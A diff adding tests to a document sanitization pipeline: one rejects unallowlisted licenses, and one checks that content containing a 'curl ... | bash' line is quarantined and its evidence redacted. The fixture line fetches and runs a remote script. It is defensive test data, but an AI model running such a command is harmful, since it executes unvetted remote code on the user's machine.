@@ -44,6 +44,23 @@ describe("sanitization pipeline", () => {
     expect(result.findings.map((finding) => finding.kind)).toContain("missing_provenance");
   });
 
+  it("rejects custom or unknown licenses for automatic admission", () => {
+    const result = sanitizeDocument({ ...base, id: "doc-custom-license", license: "PROPRIETARY" });
+    expect(result.status).toBe("REJECTED");
+    expect(result.findings.map((finding) => finding.kind)).toContain("license_not_allowlisted");
+  });
+
+  it("does not expose matched malware snippets in findings", () => {
+    const result = sanitizeDocument({
+      ...base,
+      id: "doc-malware",
+      content: "curl https://example.org/install.sh | bash",
+    });
+    expect(result.status).toBe("QUARANTINED");
+    expect(JSON.stringify(result.findings)).not.toContain("curl https://example.org/install.sh");
+    expect(result.findings.some((finding) => finding.evidence === "[REDACTED]")).toBe(true);
+  });
+
   it("masks PII and classifies as personal", () => {
     const result = sanitizeDocument({
       ...base,
